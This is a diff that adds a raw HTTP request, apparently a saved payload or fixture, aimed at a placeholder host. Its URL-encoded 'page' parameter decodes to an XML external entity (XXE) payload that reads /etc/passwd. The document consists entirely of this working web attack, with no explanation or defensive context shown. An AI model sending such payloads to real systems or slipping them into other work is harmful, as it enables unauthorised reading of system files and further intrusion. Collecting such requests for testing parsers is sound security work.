@@ -1,0 +1,4 @@
+GET /a?page=%3C%21DOCTYPE%2Br%2B%5B%3C%21ENTITY%2Bx%2BPUBLIC%2B%22-%2F%2FX%2F%2FY%22%2B%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
